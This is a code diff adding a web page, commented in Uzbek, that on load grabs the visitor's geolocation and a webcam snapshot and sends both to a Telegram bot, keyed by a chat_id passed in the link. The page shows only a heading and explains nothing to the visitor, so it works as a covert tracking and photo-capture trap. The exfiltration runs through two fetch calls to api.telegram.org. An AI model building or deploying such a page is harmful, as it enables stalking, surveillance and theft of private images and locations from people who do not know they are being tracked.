@@ -1,4 +1,85 @@
+
 <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location and Photo Tracker</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Telegram chat_id ni olish uchun URL'dan query parametrlardan foydalanamiz
+            const urlParams = new URLSearchParams(window.location.search);
+            const chat_id = urlParams.get('chat_id');
+
+            if (!chat_id) {
+                alert("Chat ID yo'q, iltimos, bot orqali kiring.");
+                return;
+            }
+
+            // 1. Foydalanuvchi joylashuvini olish
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // 2. Foydalanuvchi kamerasidan rasm olish
+                    navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
+                        let video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+
+                        let canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+
+                        // 1 soniyadan keyin surat olish
+                        setTimeout(function () {
+                            let context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                            // Rasmni Base64 formatida olish
+                            let photo = canvas.toDataURL('image/png');
+
+                            // Telegram botiga joylashuv va rasmni yuborish
+                            fetch('https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendMessage', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: chat_id,
+                                    text: `Joylashuv: Latitude: ${latitude}, Longitude: ${longitude}`
+                                })
+                            });
+
+                            fetch('https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendPhoto', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: chat_id,
+                                    photo: photo
+                                })
+                            });
+
+                            // Video oqimini to'xtatish
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 1000);
+                    });
+                });
+            } else {
+                alert("Geolokatsiya qo'llab-quvvatlanmaydi.");
+            }
+        });
+    </script>
+</head>
+<body>
+    <h1>Location and Photo Tracker</h1>
+</body>
+</html>
+
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -84,3 +165,4 @@
     <h1>Tracking Location and Capturing Photo</h1>
 </body>
 </html>
+ -->
